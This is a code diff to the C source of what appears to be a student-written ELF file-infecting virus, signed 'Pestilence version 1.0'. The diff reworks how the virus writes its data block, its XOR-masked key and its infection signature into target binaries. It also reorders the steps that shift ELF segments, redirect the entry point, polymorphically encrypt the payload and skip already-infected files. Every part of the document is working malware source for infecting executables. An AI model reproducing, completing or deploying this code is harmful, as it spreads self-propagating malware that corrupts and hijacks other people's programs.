@@ -8,7 +8,7 @@ int get_sig(char *s, size_t n, size_t virus_len, char *sig)
 	Elf64_Ehdr *h = (void*)s;
 	size_t entry = elf_addr_to_offset(s,n,h->e_entry);
 	size_t sig_len = slen(sig);
-
+	//TODO!! STRNlENGTHEN
 	if (entry + virus_len >= n)
 		return FALSE; //not infected
 
@@ -70,19 +70,26 @@ static void _insert_zeros(char **s, size_t *n, size_t pos, size_t add){
 
 void update(char *b, size_t n, size_t old_entry, size_t entry, struct s_opt opt, char *s, size_t sn, bool compressed, struct s_infect_params params){
 	//add a few information about himself
-	size_t pos = 0;
-	//modifying 2bit after
-	uint64_t *p = ((uint64_t *)(char*)(b + pos + DATA));
+	debug_ext("data_off>>", params.data_off, "\n");
+	uint64_t *p = ((uint64_t *)(char*)(b + params.data_off));
 	p[0] = max(old_entry,entry) - min(old_entry,entry);
-	struct s_opt *p_opt = (struct s_opt*)(((char *)b+DATA+8));
-	*p_opt = opt;
+	//struct s_opt *p_opt = (struct s_opt*)(((char *)b+DATA+8));
+	*(struct s_opt *)(p + 1) = opt;
+	debug("compresse", p + 2, "\n");
 	p[2] = compressed;
-	p[3] = ((uint64_t*)key)[0];
-	p[4] = ((uint64_t*)key)[1];
-	*(unsigned char*)(p + 3) ^= 0b01110010;
-	int c = FALSE;
-	encrypt((char*)(p+5), 15, (uint32_t*)key, &c, params.encrypt_routine);
-	get_sig(s, sn, n, (char*)(p + 7));
+	//p[3] = ((uint64_t*)key)[0];
+	//p[4] = ((uint64_t*)key)[1];
+
+	debug_ext("dataearly_off>>", params.dataearly_off, "\n");
+	uint64_t *p2 = ((uint64_t *)(char*)(b + params.dataearly_off));
+	//debug("key", p2 + 0, "\n");
+	((unsigned char*)key)[0] ^= 0b01110010;
+	p2[0] = ((uint64_t*)key)[0];
+	p2[1] = ((uint64_t*)key)[1];
+	((unsigned char*)key)[0] ^= 0b01110010;
+	//*(unsigned char*)(p + 3) ^= 0b01110010;
+	//int c = FALSE;
+	//encrypt((char*)(p+5), 15, (uint32_t*)key, &c, params.encrypt_routine);
 }
 
 static int _infect(char **s, size_t *n, struct s_infect_params p, struct s_opt opt){
@@ -118,6 +125,17 @@ static int _infect(char **s, size_t *n, struct s_infect_params p, struct s_opt o
 	void *route = (void*)(*s + pos + p.decrypt_routine_off);
 	//void *xx = ft_malloc(1024);
 	poly_generate(&p.encrypt_routine, &route);
+	//reset it
+	elf_shift_offset(*s, *n, pos, p.bn);
+	elf_update_flags_of_load_segments(*s, *n);
+	elf_change_size_last_load_segment(*s, *n, p.bn);
+	elf_set_off_entry(*s, *n, pos);
+	h = (void*)*s;
+	ph = (*(void**)s) + h->e_phoff;
+	//TODO: check not already inf
+	//ph[x].p_memsz += changed;
+	update((*s) + pos, p.bn, old_entry, h->e_entry, opt, *s, *n, compressed, p);
+
 	//---------- z2 (encryption without compression) -------------
 	compressed = FALSE;
 	((unsigned char*)key)[0] ^= 0b01110010;
@@ -129,16 +147,9 @@ static int _infect(char **s, size_t *n, struct s_infect_params p, struct s_opt o
 	int64_t changed = encrypt(((*s) + pos + p.crypt_off), p.crypt_len, (uint32_t*)key, &compressed, p.encrypt_routine);
 	if (changed == -1)
 		return FALSE;
-	//reset it
-	elf_shift_offset(*s, *n, pos, p.bn);
-	elf_update_flags_of_load_segments(*s, *n);
-	elf_change_size_last_load_segment(*s, *n, p.bn);
-	elf_set_off_entry(*s, *n, pos);
-	h = (void*)*s;
-	ph = (*(void**)s) + h->e_phoff;
-	//TODO: check not already inf
-	//ph[x].p_memsz += changed;
-	update((*s) + pos, p.bn, old_entry, h->e_entry, opt, *s, *n, compressed, p);
+	//int get_sig(char *s, size_t n, size_t virus_len, char *sig)
+	get_sig(*s, *n, p.bn, ((uint64_t *)(char*)((*s) + pos + p.dataearly_off)) + 2);
+
 	ffree(olds2, oldn2);
 	if (olds)
 		ffree(olds, oldn);
@@ -147,18 +158,20 @@ static int _infect(char **s, size_t *n, struct s_infect_params p, struct s_opt o
 
 //=============================================================
 
-int check_already_packed(char *s, size_t n, size_t virus_len){
+int check_already_packed(char *s, size_t n, size_t virus_len, size_t dataearly_off){
 	char sig[] = "Pestilence version 1.0 (c)oded by ndombre-agadhgad-AAAAAAAA";
 	size_t sig_len = slen(sig);
 	Elf64_Ehdr *h = (void*)s;
 	size_t entry = elf_addr_to_offset(s,n,h->e_entry);
 	//check if size is enoug
-	if (entry + DATA + 7*sizeof(size_t) + sig_len >= n)
+	if (entry + dataearly_off + sig_len >= n)
 		return TRUE;
 	if (get_sig(s, n, virus_len, sig) == FALSE)
 		return TRUE;
-	size_t *p = ((size_t *)(char*)(s + entry + DATA));
-	if (sncmp((char*)(p+7), sig, sig_len) == 0)
+	char *p = (char*)(((uint64_t *)(s + entry + dataearly_off)) + 2);
+	//size_t *p = ((size_t *)(char*)(s + entry + DATA));
+	debug("cmp ", sig, " ", p, "\n");
+	if (sncmp(p, sig, sig_len) == 0)
 		return fail("already packed");
 	return TRUE;
 }
@@ -174,7 +187,7 @@ int infect(char *fname, char *outname, struct s_infect_params p, struct s_opt op
 		goto fail;
 	}
 	if (elf_check_valid(s, n) == FALSE) goto fail;
-	if (!check_already_packed(s, n, p.bn)) goto fail;
+	if (!check_already_packed(s, n, p.bn, p.dataearly_off)) goto fail;
 
 	//after insert, update data
 	if (!_infect(&s,&n, p, opt))
